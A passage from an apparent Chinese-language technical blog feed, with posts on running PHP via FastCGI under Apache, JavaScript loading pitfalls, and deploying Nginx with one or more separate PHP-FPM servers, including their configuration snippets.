<h4 id="4-FastCGI-模式运行-PHP-的优点"><a href="#4-FastCGI-模式运行-PHP-的优点" class="headerlink" title="4. FastCGI 模式运行 PHP 的优点"></a>4. FastCGI 模式运行 PHP 的优点</h4><p>以 FastCGI 模式运行 PHP 有几个主要的好处。首先就是 PHP 出错的时候不会搞垮 Apache，只是 PHP 自己的进程当掉（但 FastCGI 会立即重新启动一个新 PHP 进程来代替当掉的进程）。其次 FastCGI 模式运行 PHP 比 ISAPI 模式性能更好（我本来用 ApacheBench 进行了测试，但忘了保存结果，大家有兴趣可以自己测试）。</p>
<p>最后，就是可以同时运行 PHP5 和 PHP4。参考下面的配置文件，分别建立了两个虚拟主机，其中一个使用 PHP5，另一个使用 PHP4。 </p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">LoadModule</span> fastcgi_module modules/mod_fastcgi-<span class="number">2</span>.<span class="number">4</span>.<span class="number">2</span>-AP13.dll</span><br><span class="line"><span class="attribute">ScriptAlias</span> /fcgi-php5/ <span class="string">&quot;d:/usr/local/php-5.0.4/&quot;</span></span><br><span class="line"><span class="attribute">FastCgiServer</span> <span class="string">&quot;d:/usr/local/php-5.0.4/php-cgi.exe&quot;</span> -processes <span class="number">3</span></span><br><span class="line"><span class="attribute">ScriptAlias</span> /fcgi-php4/ <span class="string">&quot;d:/usr/local/php-4.3.11/&quot;</span></span><br><span class="line"><span class="attribute">FastCgiServer</span> <span class="string">&quot;d:/usr/local/php-4.3.11/php.exe&quot;</span></span><br><span class="line"><span class="attribute">Listen</span> <span class="number">80</span></span><br><span class="line"><span class="attribute">NameVirtualHost</span> *:<span class="number">80</span></span><br><span class="line"><span class="attribute">DocumentRoot</span> d:/www</span><br><span class="line"><span class="attribute">Options</span> Indexes FollowSymlinks MultiViews</span><br><span class="line"><span class="attribute">ServerName</span> php5.localhost</span><br><span class="line"><span class="attribute">AddType</span> application/x-httpd-fastphp5 .php</span><br><span class="line"><span class="attribute">Action</span> application/x-httpd-fastphp5 <span class="string">&quot;/fcgi-php5/php-cgi.exe&quot;</span></span><br><span class="line"> </span><br><span class="line"><span class="attribute">IndexOptions</span> FancyIndexing FoldersFirst</span><br><span class="line"><span class="attribute">Options</span> Indexes FollowSymLinks MultiViews</span><br><span class="line"><span class="attribute">AllowOverride</span> None</span><br><span class="line"><span class="attribute">Order</span> <span class="literal">allow</span>,<span class="literal">deny</span></span><br><span class="line"><span class="attribute">Allow</span> from <span class="literal">all</span></span><br><span class="line"> </span><br><span class="line"><span class="attribute">Listen</span> <span class="number">8080</span></span><br><span class="line"><span class="attribute">NameVirtualHost</span> *:<span class="number">8080</span></span><br><span class="line"> </span><br><span class="line"><span class="attribute">DocumentRoot</span> d:/www</span><br><span class="line"><span class="attribute">Options</span> Indexes FollowSymlinks MultiViews</span><br><span class="line"><span class="attribute">ServerName</span> php4.localhost</span><br><span class="line"><span class="attribute">AddType</span> application/x-httpd-fastphp4 .php</span><br><span class="line"><span class="attribute">Action</span> application/x-httpd-fastphp4 <span class="string">&quot;/fcgi-php4/php.exe&quot;</span></span><br><span class="line"> </span><br><span class="line"><span class="attribute">Options</span> Indexes FollowSymLinks MultiViews</span><br><span class="line"><span class="attribute">AllowOverride</span> None</span><br><span class="line"><span class="attribute">Order</span> <span class="literal">allow</span>,<span class="literal">deny</span></span><br><span class="line"><span class="attribute">Allow</span> from <span class="literal">all</span></span><br></pre></td></tr></table></figure>

<p>使用上面的配置，访问 <span class="exturl" data-url="aHR0cDovL2xvY2FsaG9zdC8=">http://localhost/<i class="fa fa-external-link-alt"></i></span> 就使用 PHP5，而访问 <span class="exturl" data-url="aHR0cDovL2xvY2FsaG9zdDo4MDgwLw==">http://localhost:8080/<i class="fa fa-external-link-alt"></i></span> 就使用 PHP4。所以只要合理配置，就可以让不同的虚拟主机使用不同版本的 PHP。</p>
<h4 id="5-FastCGI-模式的一些缺点："><a href="#5-FastCGI-模式的一些缺点：" class="headerlink" title="5. FastCGI 模式的一些缺点："></a>5. FastCGI 模式的一些缺点：</h4><p>说完了好处，也来说说缺点。从我的实际使用来看，用 FastCGI 模式更适合生产环境的服务器。但对于开发用机器来说就不太合适。因为当使用 Zend Studio 调试程序时，由于 FastCGI 会认为 PHP 进程超时，从而在页面返回 500 错误。这一点让人非常恼火，所以我在开发机器上还是换回了 ISAPI 模式。</p>
<p>最后，在 Windows 中以 FastCGI 模式存在潜在的安  </p>
<h4 id="Php-在-nginx-中运行模式-nginx-PHP-FPM-目前理想选择"><a href="#Php-在-nginx-中运行模式-nginx-PHP-FPM-目前理想选择" class="headerlink" title="Php 在 nginx 中运行模式 (nginx+PHP-FPM) 目前理想选择"></a>Php 在 nginx 中运行模式 (nginx+PHP-FPM) 目前理想选择</h4><p>使用 FastCGI 方式现在常见的有两种 stack：ligthttpd+spawn-fcgi; 另外一种是 nginx+PHP-FPM (也可以用 spawn-fcgi) 。</p>
<p>(1) 如上面所说该两种结构都采用 FastCGI 对 PHP 支持，因此 HTTPServer 完全解放出来，可以更好地进行响应和并发处理。因此 lighttpd 和 nginx 都有 small, but powerful 和 efficient 的美誉。 </p>
<p>(2) 该两者还可以分出一个好坏来，spawn-fcgi 由于是 lighttpd 的一部分，因此安装了 lighttpd 一般就会使用 spawn-fcgi 对 php 支持，但是目前有用户说 ligttpd 的 spwan-fcgi 在高并发访问的时候，会出现上面说的内存泄漏甚至自动重启 fastcgi。即：PHP 脚本处理器当机，这个时候如果用户访问的话，可能就会出现白页 (即 PHP 不能被解析或者出错)。 </p>
<p>另一个：首先 nginx 不像 lighttpd 本身含带了 fastcgi (spawn-fcgi)，因此它完全是轻量级的，必须借助第三方的 FastCGI 处理器才可以对 PHP 进行解析，因此其实这样看来 nginx 是非常灵活的，它可以和任何第三方提供解析的处理器实现连接从而实现对 PHP 的解析 (在 nginx.conf 中很容易设置)。 </p>
<p>nginx 可以使用 spwan-fcgi (需要一同安装 lighttpd，但是需要为 nginx 避开端口，一些较早的 blog 有这方面安装的教程)，但是由于 spawn-fcgi 具有上面所述的用户逐渐发现的缺陷，现在慢慢减少使用 nginx+spawn-fcgi 组合了。</p>
<p> c. 由于 spawn-fcgi 的缺陷，现在出现了新的第三方 (目前还是，听说正在努力不久将来加入到 PHP core 中) 的 PHP 的 FastCGI 处理器，叫做 PHP-FPM (具体可以 google)。它和 spawn-fcgi 比较起来有如下优点： </p>
<p>由于它是作为 PHP 的 patch 补丁来开发的，安装的时候需要和 php 源码一起编译，也就是说编译到 php core 中了，因此在性能方面要优秀一些；</p>
<p>同时它在处理高并发方面也优于 spawn-fcgi，至少不会自动重启 fastcgi 处理器。具体采用的算法和设计可以 google 了解。 </p>
<p>因此，如上所说由于 nginx 的轻量和灵活性，因此目前性能优越，越来越多人逐渐使用这个组合：nginx+PHP&#x2F;PHP-FPM</p>
<h4 id="IIS-ISAPI-模式"><a href="#IIS-ISAPI-模式" class="headerlink" title="IIS + ISAPI 模式"></a>IIS + ISAPI 模式</h4><p>这种模式适合开发环境中， 生产环境中用的较少。  </p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>目前在 HTTPServer 这块基本可以看到有三种 stack 比较流行：</p>
<figure class="highlight smali"><table><tr><td class="code"><pre><span class="line">（1）Apache+mod_php5</span><br><span class="line">（2）lighttp+spawn-fcgi</span><br><span class="line">（3）nginx+PHP-FPM</span><br></pre></td></tr></table></figure>

<p>三者后两者性能可能稍优，但是 Apache 由于有丰富的模块和功能，目前来说仍旧是老大。有人测试 nginx+PHP-FPM 在高并发情况下可能会达到 Apache+mod_php5 的 5~10 倍，现在 nginx+PHP-FPM 使用的人越来越多。</p>
]]></content>
      <categories>
        <category>Apache</category>
      </categories>
  </entry>
  <entry>
    <title>JS 开发中遇到的坑</title>
    <url>/2017/05/javascript-debug/</url>
    <content><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>在 HTML 中，把 JS 代码移植到 JS 文件中，然后加载该 JS 文件，需要注意几个细节问题。</p>
<span id="more"></span>

<p>1，原来的变量和函数放在 该放什么位置还是什么位置， 但所有的事件必须放在 $(function (){}) 里面去，当然这是和在页面中是一样的都需要放在 $(function (){} 里面。</p>
<p>例如，点击事件或者滚动事件。</p>
<p>代码示例：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">$(<span class="variable language_">window</span>).<span class="title function_">scroll</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> ($(<span class="variable language_">document</span>).<span class="title function_">scrollTop</span>() + $(<span class="variable language_">window</span>).<span class="title function_">height</span>() &gt;= $(<span class="variable language_">document</span>).<span class="title function_">height</span>()-<span class="number">5</span> &amp;&amp; canLoadMore) &#123;</span><br><span class="line">        <span class="title function_">scroll</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>2，在加载的 JS 文件中，使用 JS 模板进行显示数据的话，获取的 JS 模板页面的时候，会把一些特殊符号给取消。</p>
<p>例如，{：}</p>
<p>代码示例：</p>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">html</span> = html.replace(/&#123;:goods_id&#125;/g,data.goods_id)<span class="comment">;​​​</span></span><br><span class="line"><span class="attr">html</span> = html.replace(/goods_id/g,data.goods_id)<span class="comment">;</span></span><br></pre></td></tr></table></figure>

<p>3，最大的坑， 每次更新 JS 不生效的时候，需要使用 Ctrl + F5 ，无缓存刷新页面，来加载最新的 JS 功能。</p>
]]></content>
      <categories>
        <category>Javascript</category>
      </categories>
  </entry>
  <entry>
    <title>提高 WEB 性能！Nginx 和 PHP-FPM 分别部署在不同服务器</title>
    <url>/2017/05/nginx-php-fpm/</url>
    <content><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>大家都知道 php-fpm 经常会占用很多 cpu 资源。</p>
<p>所以想要尝试把 nginx 和 php-fpm 分开在两台服务器上搭建（本人并不确定这样是不是可以提高服务器性能，以后有时间会做测试）。</p>
<span id="more"></span>

<p>可能这种做法并不是主流的配置方案，所以网上资料比较少，而且都是编译安装，要修改很多很多参数，我看了几篇照着做也没有做出来。</p>
<p>本着不抛弃不放弃的精神，本人咨询了认识的几位大神，终于百般折腾把实验做通了（其实是让大神远程过来帮忙的）。</p>
<p>声明，我这里所有的配置都是 yum 安装；所以步骤特别简单，想要深入的了解各参数的使用还是自己去找资料吧！！！</p>
<h2 id="服务器"><a href="#服务器" class="headerlink" title="服务器"></a>服务器</h2><p>Nginx 服务器 server06 IP地址 <code>192.168.10.66</code></p>
<p>PHP-FPM 服务器 server03 IP地址 <code>192.168.10.63</code></p>
<h2 id="Nginx-服务器设置"><a href="#Nginx-服务器设置" class="headerlink" title="Nginx 服务器设置"></a>Nginx 服务器设置</h2><p>[root@server06~]# yum install nginx #安装 nginx</p>
<p>[root@server06 ~]# cd &#x2F;etc&#x2F;nginx&#x2F;conf.d&#x2F;</p>
<p>[<span class="exturl" data-url="bWFpbHRvOiYjeDcyOyYjMTExOyYjMTExOyYjeDc0OyYjeDQwOyYjMTE1OyYjMTAxOyYjMTE0OyYjeDc2OyYjMTAxOyYjeDcyOyYjNDg7JiN4MzY7JiM5OTsmI3g2ZjsmIzExMDsmIzEwMjsmIzQ2OyYjeDY0Ow==">&#x72;&#111;&#111;&#x74;&#x40;&#115;&#101;&#114;&#x76;&#101;&#x72;&#48;&#x36;&#99;&#x6f;&#110;&#102;&#46;&#x64;<i class="fa fa-external-link-alt"></i></span>]# cp default.conf default.conf.bak</p>
<p>[<span class="exturl" data-url="bWFpbHRvOiYjMTE0OyYjeDZmOyYjMTExOyYjMTE2OyYjNjQ7JiN4NzM7JiMxMDE7JiMxMTQ7JiMxMTg7JiN4NjU7JiN4NzI7JiN4MzA7JiN4MzY7JiN4NjM7JiMxMTE7JiMxMTA7JiMxMDI7JiN4MmU7JiMxMDA7">&#114;&#x6f;&#111;&#116;&#64;&#x73;&#101;&#114;&#118;&#x65;&#x72;&#x30;&#x36;&#x63;&#111;&#110;&#102;&#x2e;&#100;<i class="fa fa-external-link-alt"></i></span>]# vim default.conf</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="section">location</span> <span class="regexp">~ \.php$</span> &#123;</span><br><span class="line">    <span class="attribute">root</span>           /www;     <span class="comment">#php-fpm服务器上*.php页面文件存放路径</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#fastcgi_pass   127.0.0.1:9000;</span></span><br><span class="line"></span><br><span class="line">    <span class="attribute">fastcgi_pass</span>   <span class="number">192.168.10.63:9000</span>;  <span class="comment">#这里指向处理php的服务器IP</span></span><br><span class="line"></span><br><span class="line">    <span class="attribute">fastcgi_index</span>  index.php;</span><br><span class="line"></span><br><span class="line">    <span class="attribute">fastcgi_param</span>  SCRIPT_FILENAME  <span class="variable">$document_root</span><span class="variable">$fastcgi_script_name</span>;</span><br><span class="line"></span><br><span class="line">    <span class="attribute">include</span>        fastcgi_params;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>[<span class="exturl" data-url="bWFpbHRvOiYjeDcyOyYjeDZmOyYjMTExOyYjeDc0OyYjeDQwOyYjMTE1OyYjMTAxOyYjeDcyOyYjMTE4OyYjMTAxOyYjMTE0OyYjNDg7JiM1NDsmIzk5OyYjMTExOyYjMTEwOyYjeDY2OyYjeDJlOyYjMTAwOw==">&#x72;&#x6f;&#111;&#x74;&#x40;&#115;&#101;&#x72;&#118;&#101;&#114;&#48;&#54;&#99;&#111;&#110;&#x66;&#x2e;&#100;<i class="fa fa-external-link-alt"></i></span>]# service nginx restart   #启动 nginx 服务</p>
<h2 id="Php-fpm-服务器设置"><a href="#Php-fpm-服务器设置" class="headerlink" title="Php-fpm 服务器设置"></a>Php-fpm 服务器设置</h2><p>[root@server03~]# mkdir &#x2F;www #创建 php 文件目录</p>
<p>[root@server03~]# vim &#x2F;www&#x2F;index.php #创建 php 主页，显示 php 信息</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">phpinfo</span>();</span><br></pre></td></tr></table></figure>

<p>[root@server03~]# yum install php-fpm  #安装 php-fpm</p>
<p>[root@server03~]# vim &#x2F;etc&#x2F;php-fpm.d&#x2F;<span class="exturl" data-url="aHR0cDovL3d3dy5jb25mLw==">www.conf<i class="fa fa-external-link-alt"></i></span>     #配置文件修改</p>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="comment">; The address onwhich to accept FastCGI requests.</span></span><br><span class="line"></span><br><span class="line"><span class="comment">; Valid syntaxesare:</span></span><br><span class="line"></span><br><span class="line"><span class="comment">;   &#x27;ip.add.re.ss:port&#x27;    - to listen on a TCP socket to a specificaddress on</span></span><br><span class="line"></span><br><span class="line"><span class="comment">;                            a specific port;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">;   &#x27;port&#x27;                 - to listen on a TCP socket toall addresses on a</span></span><br><span class="line"></span><br><span class="line"><span class="comment">;                            specific port;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">;   &#x27;/path/to/unix/socket&#x27; - to listen on a unixsocket.</span></span><br><span class="line"></span><br><span class="line"><span class="comment">; <span class="doctag">Note:</span> Thisvalue is mandatory.</span></span><br><span class="line"></span><br><span class="line"><span class="comment">;listen = 127.0.0.1:9000</span></span><br><span class="line"></span><br><span class="line"><span class="attr">listen</span> = <span class="number">192.168</span>.<span class="number">10.63</span>  <span class="comment">#改成自己的IP地址</span></span><br><span class="line"></span><br><span class="line"><span class="comment">; List of ipv4addresses of FastCGI clients which are allowed to connect.</span></span><br><span class="line"></span><br><span class="line"><span class="comment">; Equivalent tothe FCGI_WEB_SERVER_ADDRS environment variable in the original</span></span><br><span class="line"></span><br><span class="line"><span class="comment">; PHP FCGI(5.2.2+). Makes sense only with a tcp listening socket. Each address</span></span><br><span class="line"></span><br><span class="line"><span class="comment">; must beseparated by a comma. If this value is left blank, connections will be</span></span><br><span class="line"></span><br><span class="line"><span class="comment">; accepted fromany ip address.</span></span><br><span class="line"></span><br><span class="line"><span class="comment">; Default Value:any</span></span><br><span class="line"></span><br><span class="line"><span class="comment">;listen.allowed_clients =127.0.0.1       </span></span><br><span class="line"></span><br><span class="line"><span class="attr">listen.allowed_clients</span> = <span class="number">192.168</span>.<span class="number">10.66</span> <span class="comment">#设置允许连接到 FastCGI 的服务器 IPV4 地址。如果允许所有那么把这条注释掉即可</span></span><br></pre></td></tr></table></figure>

<p>[root@server03~]# service php-fpm start  #启动 php-fpm</p>
<h2 id="测试结果"><a href="#测试结果" class="headerlink" title="测试结果"></a>测试结果</h2><p>这里访问 index.php 已经可以显示 php 的信息了！！说明代理成功；</p>
<p>这里直接访问 nginx 服务器，则显示 nginx 的默认页面；说明是在 server06 这台服务器处理的；</p>
]]></content>
      <categories>
        <category>Nginx</category>
      </categories>
      <tags>
        <tag>PHP-FPM</tag>
      </tags>
  </entry>
  <entry>
    <title>Nginx 后端代理多台 PHP-FPM 服务器</title>
    <url>/2017/05/nginx-php-fpm1/</url>
    <content><![CDATA[<h2 id="服务器"><a href="#服务器" class="headerlink" title="服务器"></a>服务器</h2><p>Nginx 服务器 server06 IP地址 <code>192.168.10.66</code></p>
<p>PHP-FPM 服务器 server03 IP地址 <code>192.168.10.63</code></p>
<p>PHP-FPM 服务器 server04 IP地址 <code>192.168.10.64</code></p>
<span id="more"></span>

<h2 id="Nginx-服务器设置"><a href="#Nginx-服务器设置" class="headerlink" title="Nginx 服务器设置"></a>Nginx 服务器设置</h2><p>[root@server06 ~]# yum installnginx #安装 nginx</p>
<p>[root@server06 ~]# cd&#x2F;etc&#x2F;nginx&#x2F;</p>
<p>[root@server06 nginx]# vim nginx.conf</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="section">http</span> &#123;</span><br><span class="line">    <span class="attribute">include</span>       /etc/nginx/mime.types;</span><br><span class="line"></span><br><span class="line">    <span class="attribute">default_type</span>  application/octet-stream;</span><br><span class="line"></span><br><span class="line">    <span class="attribute">log_format</span> main <span class="string">&#x27;<span class="variable">$remote_addr</span> - <span class="variable">$remote_user</span>[<span class="variable">$time_local</span>] &quot;<span class="variable">$request</span>&quot; &#x27;</span></span><br><span class="line">                    <span class="string">&#x27;<span class="variable">$status</span> <span class="variable">$body_bytes_sent</span>&quot;<span class="variable">$http_referer</span>&quot; &#x27;</span></span><br><span class="line">                    <span class="string">&#x27;&quot;<span class="variable">$http_user_agent</span>&quot; &quot;<span class="variable">$http_x_forwarded_for</span>&quot;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="attribute">access_log</span> /var/log/nginx/access.log  main;</span><br><span class="line">  </span><br><span class="line">    <span class="attribute">sendfile</span>        <span class="literal">on</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">#tcp_nopush     on;</span></span><br><span class="line"></span><br><span class="line">    <span class="attribute">keepalive_timeout</span>  <span class="number">65</span>;</span><br><span class="line">  </span><br><span class="line">    <span class="comment">#gzip on;</span></span><br><span class="line"></span><br><span class="line">    <span class="section">upstream</span> fastcgiserver &#123; <span class="comment">#设置后端php-fpm服务器ip及端口</span></span><br><span class="line">        <span class="attribute">server</span> <span class="number">192.168.10.63:9000</span>;</span><br><span class="line"></span><br><span class="line">        <span class="attribute">server</span> <span class="number">192.168.10.64:9000</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="attribute">include</span> /etc/nginx/conf.d/<span class="regexp">*.conf</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>[root@server06 nginx]# cd &#x2F;etc&#x2F;nginx&#x2F;conf.d&#x2F;</p>
<p>[root@server06 conf.d]# cp default.conf default.conf.bak</p>
<p>[root@server06 conf.d]# vimdefault.conf</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="section">location</span> <span class="regexp">~ \.php$</span> &#123;</span><br><span class="line">    <span class="attribute">root</span>           /www;     <span class="comment">#php-fpm服务器上*.php页面文件存放路径</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#fastcgi_pass   127.0.0.1:9000;</span></span><br><span class="line"></span><br><span class="line">    <span class="attribute">fastcgi_pass</span>   fastcgiserver;  <span class="comment">#这里调用upstream设置；</span></span><br><span class="line"></span><br><span class="line">    <span class="attribute">fastcgi_index</span>  index.php;</span><br><span class="line"></span><br><span class="line">    <span class="attribute">fastcgi_param</span>  SCRIPT_FILENAME  <span class="variable">$document_root</span><span class="variable">$fastcgi_script_name</span>;</span><br><span class="line"></span><br><span class="line">    <span class="attribute">include</span>        fastcgi_params;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>[root@server06 conf.d]# servicenginx restart   #启动 nginx 服务</p>
<h2 id="Php-fpm-服务器设置（server03-和-server04-一样的配置）"><a href="#Php-fpm-服务器设置（server03-和-server04-一样的配置）" class="headerlink" title="Php-fpm 服务器设置（server03 和 server04 一样的配置）"></a>Php-fpm 服务器设置（server03 和 server04 一样的配置）</h2><p>[root@server03~]# mkdir &#x2F;www #创建 php 文件目录</p>
<p>[root@server03~]# vim &#x2F;www&#x2F;index.php #创建 php 主页，显示 php 信息</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;server03&quot;</span>;    <span class="comment">#这里仅仅用来识别server03和server04</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">phpinfo</span>()</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>[root@server03~]# yum install php-fpm  #安装 php-fpm</p>
<p>[root@server03~]# vim &#x2F;etc&#x2F;php-fpm.d&#x2F;<span class="exturl" data-url="aHR0cDovL3d3dy5jb25mLw==">www.conf<i class="fa fa-external-link-alt"></i></span>     #配置文件修改</p>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="comment">; The address onwhich to accept FastCGI requests.</span></span><br><span class="line"></span><br><span class="line"><span class="comment">; Valid syntaxesare:</span></span><br><span class="line"></span><br><span class="line"><span class="comment">;   &#x27;ip.add.re.ss:port&#x27;    - to listen on a TCP socket to a specificaddress on</span></span><br><span class="line"></span><br><span class="line"><span class="comment">;                            a specific port;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">;   &#x27;port&#x27;                 - to listen on a TCP socket toall addresses on a</span></span><br><span class="line"></span><br><span class="line"><span class="comment">;                            specific port;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">;   &#x27;/path/to/unix/socket&#x27; - to listen on a unixsocket.</span></span><br><span class="line"></span><br><span class="line"><span class="comment">; <span class="doctag">Note:</span> Thisvalue is mandatory.</span></span><br><span class="line"></span><br><span class="line"><span class="comment">;listen = 127.0.0.1:9000</span></span><br><span class="line"></span><br><span class="line"><span class="attr">listen</span> = <span class="number">192.168</span>.<span class="number">10.63</span>  <span class="comment">#改成自己的IP地址</span></span><br><span class="line"></span><br><span class="line"><span class="comment">; List of ipv4addresses of FastCGI clients which are allowed to connect.</span></span><br><span class="line"></span><br><span class="line"><span class="comment">; Equivalent tothe FCGI_WEB_SERVER_ADDRS environment variable in the original</span></span><br><span class="line"></span><br><span class="line"><span class="comment">; PHP FCGI(5.2.2+). Makes sense only with a tcp listening socket. Each address</span></span><br><span class="line"></span><br><span class="line"><span class="comment">; must beseparated by a comma. If this value is left blank, connections will be</span></span><br><span class="line"></span><br><span class="line"><span class="comment">; accepted fromany ip address.</span></span><br><span class="line"></span><br><span class="line"><span class="comment">; Default Value:any</span></span><br><span class="line"></span><br><span class="line"><span class="comment">;listen.allowed_clients =127.0.0.1       </span></span><br><span class="line"></span><br><span class="line"><span class="attr">listen.allowed_clients</span> = <span class="number">192.168</span>.<span class="number">10.66</span> <span class="comment">#设置允许连接到 FastCGI 的服务器 IPV4 地址。如果允许所有那么把这条注释掉即可</span></span><br></pre></td></tr></table></figure>

<p>[root@server03 ~]# service php-fpm start # 启动 php-fpm</p>
<p>测试结果：可以看到这里是分别调用了 server03 和 server04 两台服务器；每次刷新都会轮询；</p>
]]></content>
      <categories>
        <category>Nginx</category>
      </categories>
      <tags>
        <tag>PHP-FPM</tag>
      </tags>
  </entry>
  <entry>
    <title>Nginx 和 PHP 的两种部署方式比较</title>
    <url>/2017/05/nginx-php-fpm2/</url>
    <content><![CDATA[<h2 id="2-种部署方式简介"><a href="#2-种部署方式简介" class="headerlink" title="2 种部署方式简介"></a>2 种部署方式简介</h2><p>第一种 —— 前置 1 台 nginx 服务器做 HTTP 反向代理和负载均衡</p>
<figure class="highlight excel"><table><tr><td class="code"><pre><span class="line">后面 <span class="built_in">N</span> 太服务器的 Nginx 做 Web 服务，并调用 php-fpm 提供的 fast cgi 服务</span><br><span class="line">此种部署方式最为常见，web 服务和 PHP 服务在同一台服务器上都有部署</span><br></pre></td></tr></table></figure>

<span id="more"></span>

<p>第二种</p>
<figure class="highlight tap"><table><tr><td class="code"><pre><span class="line">前置<span class="number"> 1 </span>台 nginx 服务器做 Web 服务</span><br><span class="line">后面服务器只部署 php-fpm 服务，供 nginx 服务器调用</span><br><span class="line">前置<span class="number"> 1 </span>台 nginx 服务器，在调用后面多例 php-fpm 服务时，也可以做到负载均衡</span><br></pre></td></tr></table></figure>

<h2 id="从系统设计角度"><a href="#从系统设计角度" class="headerlink" title="从系统设计角度"></a>从系统设计角度</h2><p>第一种部署是常规部署方式，大中小规模网站都能适用。</p>
<p>第二种，不同服务部署在不同服务器上，更加细致。但也有几个问题：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">前置 nginx 充当 Web 服务。对静态资源的访问、压缩传输、缓存设置等，也都集中在这台服务器上。压力会大，容易成为瓶颈。</span><br><span class="line">如果静态资源都存放于 CDN，不需要 HTTP 压缩传输，这种部署方式还算比较合理；</span><br><span class="line">承接上面两点，还可以对这种部署方式进行优化。如前置 nginx 负载均衡和反向代理，中间是 nginx Web 服务，后面部署 php-fpm 服务。</span><br></pre></td></tr></table></figure>

<h2 id="从性能角度"><a href="#从性能角度" class="headerlink" title="从性能角度"></a>从性能角度</h2><p>相比第二种部署方式，第一种多走了一次进程间交互。</p>
<figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line">按照第一种部署，当一个 <span class="keyword">http</span> 请求过来，先是 nginx 反向代理转发至 nginx Web 服务（通过网络），Web 服务再通过 fastcgi 协议与 php-fpm 进行交互（进程间交互）；</span><br><span class="line">按照第二种部署，当一个 <span class="keyword">http</span> 请求过来，充当 Web 服务的 nginx，直接通过网络与 php-fpm 进行交互</span><br></pre></td></tr></table></figure>

<p>第一种部署，通过网络交互的是 HTTP 协议，第二种通过网络交互的是 fast-cgi 协议， 这两种协议对比如何呢？</p>
<figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line"><span class="keyword">fast</span> cgi 的数据包会比 HTTP 稍微大一些，<span class="keyword">fast</span> cgi 协议会比 HTTP 携带更多的参数信息、传输控制信息等等。</span><br><span class="line"><span class="keyword">fast</span> cgi 协议比 HTTP 协议格式化严格一些，解析起来速度更快一些。</span><br></pre></td></tr></table></figure>

<h2 id="从运维角度"><a href="#从运维角度" class="headerlink" title="从运维角度"></a>从运维角度</h2><p>第一种是最常见的部署方式，简单统一，所有提供 web 服务的服务器上的服务都是同构的，单调粗放。</p>
<p>第二种则是将 nginx 和 PHP-fpm 单独分开部署，不同服务在服务器集群上的分布更加细致。如果统计 Web 服务中的压力分布，可以更加精细地利用硬件资源。运维成本也更高。</p>
<h2 id="从开发测试角度"><a href="#从开发测试角度" class="headerlink" title="从开发测试角度"></a>从开发测试角度</h2><p>两种部署方式都不合适开发环境或测试环境。</p>
<p>开发和测试环境把 nginx 和 PHP 部署到一台服务器上即可，不需要反向代理和负载均衡。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>如果是 LAMP 环境的部署，第一种比较常见。</p>
<p>如果不是 LAMP，是 nginx 和其他 fastcgi 服务交互，比如 C&#x2F;C++、Java 的 fastcgi 程序，在大规模的网络应用中，类似第二种的部署是常见的。做到不同服务之间分开部署，反而是简化了系统的网络结构，更加便于维护。</p>
<p>本文转载自：<span class="exturl" data-url="aHR0cHM6Ly9pdC56dW9jaGVuZy5uZXQvY29tcGFyZS0yLW5naW54LXBocC1kZXBsb3llZS1tb2RlLXpo">https://it.zuocheng.net/compare-2-nginx-php-deployee-mode-zh<i class="fa fa-external-link-alt"></i></span></p>
]]></content>
      <categories>
        <category>Nginx</category>
      </categories>
      <tags>
        <tag>PHP-FPM</tag>
      </tags>
  </entry>
  <entry>
    <title>Nginx 服务器究竟是怎么执行 Php 项目</title>
    <url>/2017/05/nginx-php/</url>
    <content><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>CGI 全称是 “公共网关接口”(Common Gateway Interface)，HTTP 服务器与你的或其它机 器上的程序进行 “交谈” 的一种工具，其程序须运行在网络服务器上。</p>
<p>CGI 本身可以看成是一种协议标准，它可以用任何一种语言编写具体的符合该接口标准的 协议存在，只要这种语言具有标准输入、输出和环境变量。如 php,perl,tcl 等。</p>
<span id="more"></span>

<h2 id="方法-步骤"><a href="#方法-步骤" class="headerlink" title="方法 &#x2F; 步骤"></a>方法 &#x2F; 步骤</h2><ol>
